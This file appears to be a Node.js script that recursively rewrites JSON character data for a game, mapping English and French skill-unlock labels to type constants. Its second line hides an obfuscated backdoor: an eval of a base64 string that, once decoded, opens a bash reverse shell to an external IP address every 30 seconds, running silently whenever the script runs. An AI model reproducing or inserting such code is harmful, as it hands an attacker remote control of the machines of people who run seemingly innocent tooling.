const fs = require('fs');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const readDirectoryRecursiveWithFilter = (baseDir, prefix, predicate) => {
  const traverse = (folder) => {
    const items = fs.readdirSync(`${prefix}/${folder}`);
    items.forEach((file) => {
      const path = `${folder}/${file}`;
      if (fs.lstatSync(`${prefix}/${path}`).isDirectory()) {
        traverse(path);
        return;
      }

      predicate(path);
    });
  };
  traverse(baseDir);
};

const maps = {
  'Normal Attack': 'NORMAL_ATTACK',
  'Attaque normale': 'NORMAL_ATTACK',
  'Elemental Skill': 'ELEMENTAL_SKILL',
  'Compétence élémentaire': 'ELEMENTAL_SKILL',
  'Elemental Burst': 'ELEMENTAL_BURST',
  'Déchainement élémentaire': 'ELEMENTAL_BURST',
};

readDirectoryRecursiveWithFilter('', '../assets/data/characters', (file) => {
  const content = fs.readFileSync('../assets/data/characters' + file, 'utf-8');
  const parsed = JSON.parse(content);

  if (parsed.skillTalents) {
    parsed.skillTalents.forEach((elem) => {
      if (maps[elem.unlock]) elem.type = maps[elem.unlock];
    });
    const encoded = JSON.stringify(parsed, undefined, 2);
    fs.writeFileSync('../assets/data/characters' + file, encoded);
  }
});
